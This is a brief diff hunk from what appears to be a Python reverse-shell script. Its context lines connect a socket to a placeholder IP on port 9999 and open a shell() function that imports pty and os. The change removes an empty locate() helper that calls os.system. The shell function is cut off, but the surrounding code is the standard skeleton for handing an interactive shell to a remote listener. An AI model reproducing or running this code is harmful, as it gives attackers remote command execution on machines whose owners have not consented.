@@ -6,9 +6,6 @@ from time import sleep
 ip = "0.0.0.0"
 a = socket(AF_INET, SOCK_STREAM)
 a.connect((ip, 9999))
-def locate():
-    os.system("")
-    return
 
 def shell():
     import pty, os
